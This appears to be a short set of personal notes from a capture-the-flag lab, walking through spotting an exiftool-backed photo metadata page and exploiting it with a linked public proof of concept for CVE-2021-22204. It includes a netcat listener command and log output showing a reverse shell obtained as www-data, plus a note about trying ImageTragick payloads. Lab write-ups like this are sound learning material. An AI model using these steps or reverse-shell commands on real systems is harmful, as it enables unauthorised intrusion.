- Check out the subdomain and follow link on landing page
![[Pasted image 20220505140221.png]]
- Link leads to a web page for uploading photos and displaying their meta data
![[Pasted image 20220505140330.png]]
- This output looks a lot like exiftool output.....
- Try PoC for CVE-2021-22204 from [https://github.com/convisolabs/CVE-2021-22204-exiftool]
```bash
nc -lvnp 9001           
listening on [any] 9001 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.140] 54046
/bin/sh: 0: cant access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Should be vulnerable to imagetragick I just can't find a payload that it likes
